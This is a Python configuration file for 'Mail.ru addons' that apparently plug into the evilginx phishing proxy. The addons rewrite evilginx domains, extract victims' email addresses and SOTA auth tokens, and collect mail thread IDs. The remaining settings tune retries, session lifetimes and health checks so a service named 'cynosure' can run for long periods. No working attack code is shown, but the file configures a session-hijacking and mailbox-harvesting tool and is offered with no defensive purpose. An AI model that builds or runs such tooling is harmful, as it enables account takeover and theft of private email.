"""
Configuration file for Mail.ru addons.

This file allows users to configure which addons to enable/disable.
"""

# Addon configuration - set to True to enable, False to disable
ADDON_CONFIG = {
    "url_rewriter": True,  # Fix evilginx domain issues
    "email_extractor": True,  # Extract email from URL parameters
    "auth_extractor": True,  # Extract SOTA tokens from HTML
    "thread_collector": True,  # Collect thread IDs with pagination
    "main_orchestrator": True,  # Coordinate and execute main flow
}

# Active configuration
ACTIVE_CONFIG = ADDON_CONFIG

# Session and retry configuration
SESSION_CONFIG = {
    "max_retries": 3,
    "retry_delay_base": 60,  # Base delay in seconds
    "retry_delay_multiplier": 2,  # Exponential backoff
    "max_retry_delay": 3600,  # Max 1 hour
    "max_execution_time": 86400,  # 24 hours max execution time
    "max_consecutive_errors": 5,
    "rate_limit_duration": 300,  # 5 minutes rate limit duration
    "stuck_threshold": 1800,  # 30 minutes without progress
    "health_check_interval": 300,  # 5 minutes health check interval
    "session_max_age_hours": 24,  # Max session age
    "session_max_idle_minutes": 30,  # Max idle time
}

# Service configuration
SERVICE_CONFIG = {
    "service_name": "cynosure",
    "enable_health_monitoring": True,
    "enable_retry_logic": True,
}

# Performance configuration
PERFORMANCE_CONFIG = {
    "enable_response_filtering": True,
    "max_response_size": 1024 * 1024,  # 1MB
    "max_json_size": 10 * 1024 * 1024,  # 10MB
    "skip_javascript": True,
    "skip_css": True,
    "skip_images": True,
    "skip_fonts": True,
    "skip_media": True,
    "skip_archives": True,
    "skip_bundles": True,  # Skip JS bundles, chunks, etc.
    "log_skipped_responses": False,  # Set to True for debugging
}
